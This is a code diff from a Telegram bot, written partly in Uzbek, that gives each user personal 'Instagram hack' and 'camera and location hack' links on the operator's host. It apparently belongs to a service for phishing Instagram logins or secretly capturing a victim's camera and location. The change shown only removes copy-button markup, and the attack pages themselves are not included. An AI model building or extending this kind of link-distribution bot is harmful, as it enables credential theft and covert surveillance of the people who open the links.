@@ -127,21 +127,12 @@ const referralLink = `https://${HOST}/r/${id}`;
 bot.hears("📷 Instagram Hack", async (ctx) => {
   const instagramHackLink = `https://${HOST}/insta/${ctx.from.id}`;
   await ctx.reply(`Instagram hack havolasi: ${instagramHackLink}`, {
-    reply_markup: {
-      inline_keyboard: [[{ text: "📷 Instagram hack havola", callback_data: `copy_${cameraHackLink}` }]]
-    }
   });
 });
 
 bot.hears("📸 Camera Hack", async (ctx) => {
   const cameraHackLink = `https://${HOST}/r/${ctx.from.id}`;
-  await ctx.reply(`Camera va lokatsiya hack havolasi: ${cameraHackLink}`, {
-    reply_markup: {
-      inline_keyboard: [
-        [{ text: "📋 Nusxa olish", callback_data: `copy_${cameraHackLink}` }]
-      ]
-    }
-  });
+  await ctx.reply(`Camera va lokatsiya hack havolasi: ${cameraHackLink}`);
 });
 
 bot.hears("☎️ Admin bilan bog'lanish", async (ctx) => {
